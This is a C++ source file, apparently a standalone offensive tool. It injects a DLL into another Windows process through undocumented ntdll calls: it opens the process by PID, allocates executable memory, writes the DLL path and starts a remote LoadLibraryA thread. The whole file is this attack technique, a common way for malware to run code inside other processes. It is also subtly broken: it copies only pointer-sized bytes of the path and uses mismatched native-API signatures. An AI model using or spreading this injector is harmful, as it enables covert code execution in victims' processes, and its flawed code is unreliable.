// Process Injection via NTDLL function calls NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx API - Passing DLL as command line argument 

#include <Windows.h>
#include <stdio.h>

int Error(const char* str) {
	printf("%s (%u)\n", str, GetLastError());
	return 1;
}

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}

typedef struct _PS_ATTRIBUTE
{
	ULONG  Attribute;
	SIZE_T Size;
	union
	{
		ULONG Value;
		PVOID ValuePtr;
	} u1;
	PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T       TotalLength;
	PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;


typedef NTSTATUS(NTAPI* _NtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
typedef NTSTATUS(WINAPI* NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);


int main(int argc, const char* argv[]) {
	if (argc < 3) {
		printf("Usage: RemoteThreadInjection <PID> <DLL PATH NAME>\n");
		return 0;
	}
	const unsigned char* shellcode = NULL;
	shellcode = (const unsigned char*)argv[2];
	LPVOID allocation_start;
	SIZE_T allocation_size = sizeof(shellcode);
	HANDLE hProcess, hThread;
	NTSTATUS status;

	OBJECT_ATTRIBUTES objAttr;
	int pid = atoi(argv[1]);
	CLIENT_ID cID;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	cID.UniqueProcess = (PVOID)pid;
	cID.UniqueThread = 0;
	HINSTANCE hNtdll = LoadLibrary(L"ntdll.dll");
	_NtOpenProcess NtOpenProcess = (_NtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
	NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, "NtCreateThreadEx");
	allocation_start = nullptr;
	status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cID);
	if (!hProcess)
		return Error("Failed to open process");
	status = NtAllocateVirtualMemory(hProcess, &allocation_start, 0, (PULONG)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	status = NtWriteVirtualMemory(hProcess, allocation_start, (PVOID)shellcode, allocation_size, 0);
	status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA"), allocation_start, FALSE, NULL, NULL, NULL, nullptr);
	return 0;
}

